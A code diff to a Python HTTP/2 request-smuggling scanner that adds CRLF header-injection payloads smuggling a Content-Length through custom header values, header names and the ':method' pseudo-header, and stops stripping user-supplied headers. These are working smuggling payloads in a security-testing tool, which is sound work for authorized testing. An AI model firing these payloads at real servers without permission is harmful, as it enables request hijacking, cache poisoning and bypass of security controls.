@@ -103,10 +103,6 @@ async def test_h2_cl_vulnerability(
         # Define default request headers
         request_headers = [
             ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"),
-            ("accept", "*/*"),
-            ("accept-encoding", "gzip, deflate, br"),
-            ("accept-language", "en-US;q=0.9,en;q=0.8"),
-            ("cache-control", "max-age=0"),
             ("content-type", "application/x-www-form-urlencoded"),
         ]
         
@@ -134,7 +130,7 @@ async def test_h2_cl_vulnerability(
                 'error': str(e),
             })
         
-        # Define Content-Length header mutations to test
+        # Define Content-Length header placements to check
         mutations = [
             # 1. Normal header
             {
@@ -145,17 +141,24 @@ async def test_h2_cl_vulnerability(
             },
             # 2. In custom header value
             {
-                "description": "Content-Length in custom header value",
+                "description": "H2.CL via Request Header Injection in Custom Header Value",
                 "header_name": "x-custom",
                 "header_value": "foo\r\ncontent-length: 4",
                 "type": "custom_header_value"
             },
             # 3. In custom header name
             {
-                "description": "Content-Length in custom header name",
+                "description": "H2.CL via Request Header Injection in Custom Header Name",
                 "header_name": "x-custom:foo\r\ncontent-length",
                 "header_value": "4",
                 "type": "custom_header_name"
+            },
+            # 4. In Request line
+            {
+                "description": "H2.CL via Request Line Injection",
+                "header_name": ":method",
+                "header_value": "POST / HTTP/1.1\r\nContent-Length: 4\r\nx: x",
+                "type": "request_line"
             }
         ]
         
@@ -164,7 +167,7 @@ async def test_h2_cl_vulnerability(
             mutations = [m for m in mutations if m["type"] == payload_placement]
             if not mutations:
                 logger.warning(f"No mutations found for placement type: {payload_placement}")
-                logger.warning("Valid placement types are: normal_header, custom_header_value, custom_header_name")
+                logger.warning("Valid placement types are: normal_header, custom_header_value, custom_header_name, request_line")
                 results['errors'].append({
                     'error': f"Invalid payload placement: {payload_placement}"
                 })
@@ -223,10 +226,13 @@ async def test_h2_cl_vulnerability(
                         
                     elif payload_placement == "custom_header_value":
                         # Content-Length in a custom header value position
-                        test_headers.append(("X-Test", f"{header_name}: {header_value}"))
+                        test_headers.append((header_name, header_value))
                     elif payload_placement == "custom_header_name":
                         # Content-Length in a custom header name position
-                        test_headers.append((f"{header_name}: {header_value}", "smuggled"))
+                        test_headers.append((header_name, header_value))
+                    elif payload_placement == "request_line":
+                        # Content-Length in a request line position
+                        test_headers.append((header_name, header_value))
                     
                     # Record start time
                     start_time = time.time()
@@ -417,7 +423,7 @@ async def main(args: argparse.Namespace) -> int:
         for header in args.header:
             try:
                 name, value = header.split(':', 1)
-                custom_headers.append((name.strip(), value.strip()))
+                custom_headers.append((name, value))
             except ValueError:
                 logger.warning(f"Invalid header format: {header}")
     
@@ -503,8 +509,8 @@ def parse_args() -> argparse.Namespace:
     parser.add_argument('-H', '--header', action='append', help="Add custom header (can be used multiple times)")
     parser.add_argument('-x', '--exit-first', action='store_true', help="Exit after finding the first vulnerability")
     parser.add_argument('-f', '--headers-file', help="Not used, kept for compatibility")
-    parser.add_argument('--h2-payload-placement', choices=['normal_header', 'custom_header_value', 'custom_header_name'],
-                      help="Where to place the payload (normal_header, custom_header_value, custom_header_name)")
+    parser.add_argument('--h2-payload-placement', choices=['normal_header', 'custom_header_value', 'custom_header_name', 'request_line'],
+                      help="Where to place the payload (normal_header, custom_header_value, custom_header_name, request_line)")
     return parser.parse_args()
 
 
